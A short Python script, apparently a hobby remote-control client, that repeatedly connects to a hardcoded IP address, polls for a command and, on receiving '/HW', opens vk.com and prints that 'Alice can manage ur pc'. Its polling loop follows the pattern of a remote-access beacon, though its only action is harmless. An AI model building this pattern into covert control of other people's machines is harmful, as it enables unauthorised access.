import json
import socket
import time
import webbrowser

from bs4 import BeautifulSoup


while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('176.119.147.214', 65433)) # Подключаемся к нашему серверу.
    s.sendall('/getit'.encode('utf-8')) # Отправляем фразу.
    data = s.recv(1024) #Получаем данные из сокета.
    a = data.decode('utf-8')
    if a == '/HW':
        s.close()
        webbrowser.open('vk.com')
        print('Hello world! Alice can manage ur pc')
    time.sleep(1)

